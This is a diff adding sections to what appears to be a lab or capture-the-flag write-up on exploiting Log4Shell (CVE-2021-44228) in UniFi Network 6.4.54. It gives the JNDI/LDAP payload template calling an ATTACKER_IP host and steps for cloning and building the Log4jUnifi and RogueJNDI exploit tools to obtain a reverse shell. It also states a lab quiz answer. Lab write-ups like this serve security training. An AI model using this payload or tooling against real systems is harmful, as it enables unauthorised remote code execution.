@@ -165,4 +165,127 @@ UniFi Network 6.4.54
 
 This is important because the version is affected by a well-known vulnerability in Apache Log4j.
 
+# 4. Identifying the Vulnerability
+
+The vulnerability affecting this version is:
+```
+CVE-2021-44228
+```
+
+This is the well-known Log4Shell vulnerability.
+
+Log4Shell affects vulnerable versions of Apache Log4j and can allow remote code execution through specially crafted JNDI lookup strings.
+
+The basic concept is:
+
+```
+Attacker
+   │
+   │ Malicious JNDI string
+   ▼
+UniFi Network
+   │
+   │ Log4j processes the string
+   ▼
+JNDI
+   │
+   ▼
+LDAP Server
+   │
+   ▼
+Malicious Java Payload
+   │
+   ▼
+Remote Code Execution
+```
+
+The vulnerability is associated with:
+
+CVE: CVE-2021-44228
+Name: Log4Shell
+Type: Remote Code Execution (RCE)
+MITRE ATT&CK: T1190 - Exploit Public-Facing Application
+OWASP: A06:2021 - Vulnerable and Outdated Components
+
+# 5. Understanding JNDI
+
+The next question asks:
+
+What protocol does JNDI leverage in the injection?
+
+The answer is:
+```
+LDAP
+```
+
+JNDI (Java Naming and Directory Interface) can use LDAP to retrieve remote objects.
+
+In this attack, the payload follows this general structure:
+```
+${jndi:ldap://ATTACKER_IP:1389/RESOURCE}
+```
+The vulnerable application processes the JNDI lookup and connects back to the attacker's LDAP server.
+
+# 6. Log4jUnifi
+
+Instead of manually building every part of the exploit, I used the following project:
+
+Log4jUnifi
+```
+https://github.com/puzzlepeaches/Log4jUnifi
+```
+
+The repository automates the exploitation process using a malicious JNDI server and prepares the payload required to obtain a reverse shell.
+
+Clone the repository:
+```
+git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi
+```
+Then:
+```
+cd Log4jUnifi
+```
+The repository contains:
+```
+Log4jUnifi
+├── Dockerfile
+├── exploit.py
+├── README.md
+├── requirements.txt
+└── utils
+    └── rogue-jndi
+```
+# 7. Compiling RogueJNDI
+
+The exploit requires the RogueJNDI component to be compiled.
+
+First, install Maven if necessary:
+```
+sudo apt update
+sudo apt install maven
+```
+Then check:
+```
+mvn -version
+```
+From the root of the Log4jUnifi repository:
+```
+mvn package -f utils/rogue-jndi/
+```
+Initially, the rogue-jndi directory was empty because the repository had not been cloned with its submodules.
+
+The correct cloning method is:
+```
+git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi
+```
+After cloning the submodule correctly, the build produced:
+```
+utils/rogue-jndi/target/
+├── classes
+├── generated-sources
+├── maven-archiver
+├── maven-status
+├── original-RogueJndi-1.1.jar
+└── RogueJndi-1.1.jar
+```
 
